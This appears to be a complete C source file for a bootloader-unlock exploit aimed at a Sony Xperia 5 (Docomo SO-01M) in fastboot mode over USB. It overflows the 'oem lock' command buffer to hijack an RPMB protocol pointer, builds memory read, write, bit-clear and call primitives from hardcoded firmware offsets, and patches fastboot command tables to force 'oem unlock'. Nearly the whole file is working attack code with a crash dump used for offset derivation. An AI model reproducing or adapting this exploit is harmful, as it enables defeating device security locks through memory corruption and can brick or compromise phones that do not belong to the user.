#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libusb-1.0/libusb.h>

#define BB_VID 0x0fce
#define BB_PID 0x0dde
#define TIMEOUT 3000
#define RAW_SIZE 0x5000
#define MAX_SEGS 512

static uint8_t ep_in;
static uint8_t ep_out;

int write_to_adu(libusb_device_handle *h, const void *data, int len)
{
    int transferred;
    int r = libusb_bulk_transfer(h, ep_out, (unsigned char *)data, len, &transferred, TIMEOUT);
    printf("[DEBUG] write: want=%d  result=%d  sent=%d\n", len, r, transferred);

    if (r < 0)
        printf("[ERROR] write: %s\n", libusb_error_name(r));

    // if (r == LIBUSB_ERROR_NO_DEVICE)
    //     abort();

    return r;
}

int write_to_adu_str(libusb_device_handle *h, const char *data)
{
    return write_to_adu(h, data, strlen(data));
}

int read_chunk(libusb_device_handle *h, char *buf, int size)
{
    int transferred;
    int r = libusb_bulk_transfer(h, ep_in, (unsigned char *)buf, size - 1, &transferred, TIMEOUT);
    if (r < 0)
        return r;

    buf[transferred] = '\0';
    return transferred;
}

/* Collect until OKAY or FAIL */
int collect_response(libusb_device_handle *h, char *raw, int maxlen)
{
    int total = 0;
    char tmp[512];
    while (total < maxlen - 1)
    {
        int r = read_chunk(h, tmp, sizeof(tmp));
        if (r == LIBUSB_ERROR_TIMEOUT)
            continue;
        if (r < 0)
            break;

        int to_copy = (r < maxlen - total - 1) ? r : (maxlen - total - 1);
        memcpy(raw + total, tmp, to_copy);
        total += to_copy;

        raw[total] = '\0';
        if (strstr(raw, "OKAY") || strstr(raw, "FAIL"))
            break;
    }
    return total;
}

libusb_device_handle *init_usb_device(void)
{
    libusb_device_handle *h = libusb_open_device_with_vid_pid(NULL, BB_VID, BB_PID);
    if (!h)
    {
        // printf("[ERROR] init: cannot find Key2 (VID=0x%04x PID=0x%04x)\n", BB_VID, BB_PID);
        // printf("        Boot into fastboot (power+vol-down)\n");
        return NULL;
    }
    // printf("[INFO] init: device opened\n");

    libusb_device *dev = libusb_get_device(h);
    struct libusb_config_descriptor *cfg;
    if (libusb_get_active_config_descriptor(dev, &cfg) < 0)
    {
        printf("[ERROR] init: cannot read config descriptor\n");
        libusb_close(h);
        return NULL;
    }

    const struct libusb_interface_descriptor *iface = &cfg->interface[0].altsetting[0];
    for (int i = 0; i < iface->bNumEndpoints; i++)
    {
        const struct libusb_endpoint_descriptor *e = &iface->endpoint[i];
        if (e->bEndpointAddress & LIBUSB_ENDPOINT_IN)
            ep_in = e->bEndpointAddress;
        else
            ep_out = e->bEndpointAddress;
    }
    libusb_free_config_descriptor(cfg);

    if (ep_in == 0 || ep_out == 0)
    {
        printf("[ERROR] init: bulk endpoints not found\n");
        libusb_close(h);
        return NULL;
    }

    if (libusb_kernel_driver_active(h, 0) == 1)
        libusb_detach_kernel_driver(h, 0);

    if (libusb_claim_interface(h, 0) < 0)
    {
        printf("[ERROR] init: cannot claim interface\n");
        libusb_close(h);
        return NULL;
    }
    // printf("[INFO] init: interface claimed IN=0x%02x OUT=0x%02x\n", ep_in, ep_out);
    return h;
}

void destroy_usb_device(libusb_device_handle *h)
{
    libusb_release_interface(h, 0);
    libusb_close(h);
}

#include <unistd.h>

// Offsets for Xperia 5 Docomo SO-01M P42

static const uint64_t clockDxeAddr = 0x1FFE3E000;
static const uint64_t clockDxe_BitclearPrimitive_Offset = 0x11B7C;

static const uint64_t ufsDxeAddr = 0x1FF5EB000;
static const uint64_t ufsDxe_RPMBListenerParams_Offset = 0x1b7a8;

static const uint64_t usbBufAddr = 0xFFC04000;

static const uint64_t OriginalRPMBProtocolAddr = 0x1FF604D70;

// original, relative to usbBufAddr
static const uint64_t RPMBListenerParams_Offset = 0x3D6000;

// relative to RPMBListenerParamsAddr
static const uint64_t RPMBProtocol_Offset = 0x23008;

// relative to usbBufAddr
uint64_t OurRPMBListenerParams_Offset = 0x56000;

// relative to usbBufAddr
uint64_t OurRPMBProtocol_Offset = 0x46000;

void init_primitive(libusb_device_handle *h)
{
    static const size_t resBufMaxSize = 512;
    char resBuf[resBufMaxSize] = {0};

    static const size_t allocatedBufSize = 0x1000000;
    static const size_t bufSize = (0x3F9008 + 40);
    uint8_t *buf = (uint8_t *)malloc(allocatedBufSize);

    memset(buf, 0x0, bufSize);

    {
        uint32_t off = (RPMBListenerParams_Offset + RPMBProtocol_Offset);

        *(uint64_t *)(buf + off) = (usbBufAddr + off); // real address of itself (X0)

        *(uint64_t *)(buf + off + 8) = (ufsDxeAddr + ufsDxe_RPMBListenerParams_Offset); // (lower part)

        // 0xFFFDA000 = usbBufAddr + RPMBListenerParams_Offset
        // 0xFFFDA000 -> 0xFFC5A000
        // so that it can be part of usb buffer, no more cache problems
        *(uint32_t *)(buf + off + 16) = 0x380000;

        *(uint64_t *)(buf + off + 32) = (clockDxeAddr + clockDxe_BitclearPrimitive_Offset);
    }

    sprintf(buf, "oem lock");
    write_to_adu(h, buf, bufSize);
    usleep(10 * 1000);
    read_chunk(h, resBuf, resBufMaxSize);
    printf("resBuf = %s\n", resBuf);

    free(buf);
}

void restore(libusb_device_handle *h)
{
    static const size_t resBufMaxSize = 512;
    char resBuf[resBufMaxSize] = {0};

    static const size_t allocatedBufSize = 0x1000000;
    static const size_t bufSize = 0xf0001;
    uint8_t *buf = (uint8_t *)malloc(allocatedBufSize);

    memset(buf, 0x0, bufSize);

    {
        uint32_t off = (OurRPMBListenerParams_Offset + RPMBProtocol_Offset);

        *(uint64_t *)(buf + off) = OriginalRPMBProtocolAddr;
    }

    sprintf(buf, "oem lock");
    write_to_adu(h, buf, bufSize);
    usleep(10 * 1000);
    read_chunk(h, resBuf, resBufMaxSize);
    printf("resBuf = %s\n", resBuf);

    free(buf);
}

void bitclear_primitive_4(libusb_device_handle *h, uint64_t addr, uint32_t mask)
{
    if ((addr % 4) != 0)
    {
        printf("addr must be multiple of 4!\n");
        abort();
        return;
    }

    static const size_t resBufMaxSize = 512;
    char resBuf[resBufMaxSize] = {0};

    static const size_t allocatedBufSize = 0x1000000;
    static const size_t bufSize = 0xf0001;
    uint8_t *buf = (uint8_t *)malloc(allocatedBufSize);

    memset(buf, 0x0, bufSize);

    {
        uint32_t off = (OurRPMBListenerParams_Offset + RPMBProtocol_Offset);
        uint32_t off2 = OurRPMBProtocol_Offset;

        *(uint64_t *)(buf + off) = (usbBufAddr + off2);

        *(uint64_t *)(buf + off2 + 8) = addr;
        *(uint32_t *)(buf + off2 + 16) = mask;

        *(uint64_t *)(buf + off2 + 32) = (clockDxeAddr + clockDxe_BitclearPrimitive_Offset);
    }

    sprintf(buf, "oem lock");
    write_to_adu(h, buf, bufSize);
    usleep(10 * 1000);
    read_chunk(h, resBuf, resBufMaxSize);
    printf("resBuf = %s\n", resBuf);

    free(buf);
}

// only work on non-code segment, when crashed, PC address on crash log is a value
void read_primitive_8(libusb_device_handle *h, uint64_t addr)
{
    if ((addr % 8) != 0)
    {
        printf("addr must be multiple of 8!\n");
        abort();
        return;
    }

    static const size_t resBufMaxSize = 512;
    char resBuf[resBufMaxSize] = {0};

    static const size_t allocatedBufSize = 0x1000000;
    static const size_t bufSize = 0xf0001;
    uint8_t *buf = (uint8_t *)malloc(allocatedBufSize);

    memset(buf, 0x0, bufSize);

    {
        uint32_t off = (OurRPMBListenerParams_Offset + RPMBProtocol_Offset);

        *(uint64_t *)(buf + off) = (addr - 32);
    }

    sprintf(buf, "oem lock");
    write_to_adu(h, buf, bufSize);
    usleep(10 * 1000);
    read_chunk(h, resBuf, resBufMaxSize);
    printf("resBuf = %s\n", resBuf);

    free(buf);
}

void call_primitive(libusb_device_handle *h, uint64_t addr)
{
    if ((addr % 4) != 0)
    {
        printf("addr must be multiple of 4!\n");
        abort();
        return;
    }

    static const size_t resBufMaxSize = 512;
    char resBuf[resBufMaxSize] = {0};

    static const size_t allocatedBufSize = 0x1000000;
    static const size_t bufSize = 0xf0001;
    uint8_t *buf = (uint8_t *)malloc(allocatedBufSize);

    memset(buf, 0x0, bufSize);

    {
        uint32_t off = (OurRPMBListenerParams_Offset + RPMBProtocol_Offset);
        uint32_t off2 = OurRPMBProtocol_Offset;

        *(uint64_t *)(buf + off) = (usbBufAddr + off2);
        *(uint64_t *)(buf + off2 + 32) = addr;
    }

    sprintf(buf, "oem lock");
    write_to_adu(h, buf, bufSize);
    usleep(10 * 1000);
    read_chunk(h, resBuf, resBufMaxSize);
    printf("resBuf = %s\n", resBuf);

    free(buf);
}

// assumes that all original bytes at addr is 0xff filled!

void write_primitive_4(libusb_device_handle *h, uint64_t addr, uint32_t value)
{
    bitclear_primitive_4(h, addr, ~value);
}

void write_primitive_8(libusb_device_handle *h, uint64_t addr, uint64_t value)
{
    write_primitive_4(h, addr, value);
    write_primitive_4(h, (addr + 4), (uint32_t)(value >> 32));
}

#if 0

data fault: @ 5A7445BD PC at 0x1FF5F9DE8, FAR 0xFFFFFFFFFF3F9028, iss 0x4

recovery attempted for : 1000 us
ESR 0x96000004: ec 0x25, il 0x2000000, iss 0x4
iframe 0x9ba19060:
X0   FFFFFFFFFF3F9008    X16         1FD775980
X1                  1    X17         1FD7752C0
X2                  0    X18                 0
X3           FFFDA014    X19          FFFDA000
X4                  2    X20         1FD775098
X5           FFFFFFFF    X21         1FD775098
X6                 14    X22              2000
X7                  0    X23              EE02
X8              23008    X24                28
X9                  0    X25          FFFFFFFF
X10                18    X26         1FFE321A8
X11         1FF606000    X27                 5
X12          FFFDA000    X28          32000101
X13         1FD7750A4    X29          9BA19190
X14                 0    X30         1FF5F9D4C
X15                 0    PC          1FF5F9DE8
SP          9BA19170
SPSR        60000005

// RPMBListenerParams_Offset = (0x3F9008 - RPMBProtocol_Offset)
// usbBufAddr = (0xFFFDA000 - RPMBListenerParams_Offset)

#endif

void get_RPMBListenerParams_RPMBProtocol_Offset(libusb_device_handle *h)
{
    static const size_t resBufMaxSize = 512;
    char resBuf[resBufMaxSize] = {0};

    static const size_t allocatedBufSize = 0x1000000;
    static const size_t bufSize = 0xff0001;
    uint8_t *buf = (uint8_t *)malloc(allocatedBufSize);

    memset(buf, 0x0, bufSize);

   for (uint64_t offset = 0; offset < bufSize; offset += 8)
        *(uint64_t *)(buf + offset) = 0xffffffffff000000ull | (offset);

    sprintf(buf, "oem lock");
    write_to_adu(h, buf, bufSize);
    usleep(10 * 1000);
    read_chunk(h, resBuf, resBufMaxSize);
    printf("resBuf = %s\n", resBuf);

    free(buf);
}

int main(int argc, char **argv)
{
    if (libusb_init(NULL) < 0)
    {
        printf("[ERROR] main: libusb_init failed\n");
        return 1;
    }

    libusb_set_option(NULL, LIBUSB_OPTION_LOG_LEVEL, LIBUSB_LOG_LEVEL_WARNING);

    printf("init ok\n");

    libusb_device_handle *h = 0;

    while (!h)
        h = init_usb_device();

    {
        static const size_t resBufMaxSize = 512;
        char resBuf[resBufMaxSize] = {0};

        write_to_adu_str(h, "download:");
        usleep(10 * 1000);
        read_chunk(h, resBuf, resBufMaxSize);
        printf("resBuf = %s\n", resBuf);
    }

#if 0
    get_RPMBListenerParams_RPMBProtocol_Offset(h);
    abort();
#endif

    init_primitive(h);

#if 0

    // way to get original RPMBProtocol

    {
        static const uint64_t sdccDxeBase = 0x1FF626000;

        static const uint64_t sdccDxe_RPMBListenerAllocMem_Offset = 0xD548;
        call_primitive(h, (sdccDxeBase + sdccDxe_RPMBListenerAllocMem_Offset));

        static const uint64_t sdccDxe_RPMBListenerInit_Offset = 0xD6F8;
        call_primitive(h, (sdccDxeBase + sdccDxe_RPMBListenerInit_Offset));

        // allocated mem = 0xFFADB000

        //static const uint64_t sdccDxe_RPMBListenerParams_Offset = 0x19440;
        //read_primitive_8(h, (sdccDxeBase + sdccDxe_RPMBListenerParams_Offset));

        // OriginalRPMBProtocol = 0x1FF604D70
        read_primitive_8(h, (0xFFADB000 + RPMBProtocol_Offset));
    }

#endif

    {
        static const uint64_t linuxLoaderBase = 0x1FD5A8000;
        static const uint64_t cmdline_offset = 0xB6550; // last cmdline pointer

        // cmdline = 0x1FD77E398 or 0x1FD77EA18 or 0x1FD77E018
        //read_primitive_8(h, (linuxLoaderBase + cmdline_offset));

#if 0

        typedef struct _FASTBOOT_CMD {
        struct _FASTBOOT_CMD *next;
        CONST CHAR8 *prefix;
        UINT32 prefix_len;
        VOID (*handle) (CONST CHAR8 *arg, VOID *data, UINT32 sz);
        } FASTBOOT_CMD;

#endif

        static const uint64_t oemunlockStr_offset = 0x97aed;
        static const uint64_t unlockFunc_offset = 0x3ecd0;

        // these region is 0xff filled, so we can write any value we want here

        for (uint64_t addr = 0xFD77D018; addr < 0xFD77FA00; addr += 32)
        {
            write_primitive_8(h, addr, 0x0);
            write_primitive_8(h, addr + 8, (linuxLoaderBase + oemunlockStr_offset));
            write_primitive_8(h, addr + 16, strlen("oem unlock"));
            write_primitive_8(h, addr + 24, (linuxLoaderBase + unlockFunc_offset));
        }

        // set high part of cmdline pointer to 0
        // 0x1FD77E398 -> 0xFD77E398
        write_primitive_4(h, (linuxLoaderBase + cmdline_offset + 4), 0x0);

        restore(h);

        // if succeed, this should show "unknown command"
        // then we can use oem unlock to unlock the bootloader
        // it will hang, but after next boot it will be unlocked
    }

    destroy_usb_device(h);
    h = NULL;

    libusb_exit(NULL);

    return 0;
}
